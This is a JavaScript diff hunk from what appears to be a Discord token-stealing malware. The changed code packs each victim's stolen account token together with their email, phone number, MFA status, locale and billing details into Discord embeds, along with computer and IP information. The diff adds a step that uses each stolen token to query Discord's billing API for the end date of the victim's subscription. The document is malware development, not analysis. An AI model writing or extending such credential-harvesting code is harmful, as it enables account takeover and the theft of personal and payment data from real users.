@@ -38,25 +38,30 @@ const json = async (zipFile) => {
       computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
       ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
   });
-  discordAccountInfo.accounts.forEach(account => { embeds.push({
-    description: `Token: ${codeBlock(account.token)}`,
-    author: {
-      name: `${account.username}#${account.discriminator}`,
-      icon_url: account.avatar ? avatarURL(account.id, account.avatar) : `https://cdn.discordapp.com/embed/avatars/${account.discriminator % 5}.png`
-    },
-    fields: [
-      ['🆔 ID', code(account.id)],
-      ['📜 Bio', account.bio],
-      ['🌍 Locale', code(account.locale)],
-      ['🔞 NSFW Allowed', account.nsfw_allowed],
-      ['🔐 MFA Enabled', account.mfa_enabled],
-      ['✉️ Email', account.email ? code(account.email) : 'No Email'],
-      ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
-      ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type)],
-      ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
-    ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
-    color: account.accent_color,
-  }); });
+  for (const account of discordAccountInfo.accounts) {
+    const nitroSubscriptionEnd = Math.floor(new Date((await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
+      headers: { Authorization: account.token, 'User-Agent': userAgent }
+    })).data[0].current_period_end).getTime() / 1000);
+    embeds.push({
+      description: `Token: ${codeBlock(account.token)}`,
+      author: {
+        name: `${account.username}#${account.discriminator}`,
+        icon_url: account.avatar ? avatarURL(account.id, account.avatar) : `https://cdn.discordapp.com/embed/avatars/${account.discriminator % 5}.png`
+      },
+      fields: [
+        ['🆔 ID', code(account.id)],
+        ['📜 Bio', account.bio],
+        ['🌍 Locale', code(account.locale)],
+        ['🔞 NSFW Allowed', account.nsfw_allowed],
+        ['🔐 MFA Enabled', account.mfa_enabled],
+        ['✉️ Email', account.email ? code(account.email) : 'No Email'],
+        ['📞 Phone Number', account.phone ? code(account.phone) : 'No Phone Number'],
+        ['💲 Nitro Subscription', nitroSubscriptionType(account.premium_type) + ` (ends <t:${nitroSubscriptionEnd}:R>)`],
+        ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
+      ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
+      color: account.accent_color,
+    });
+  }
   discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
     title: `Discord Account - Billing - ${billingType(billing.type)}`,
     fields: (billing.type === 1 ? [
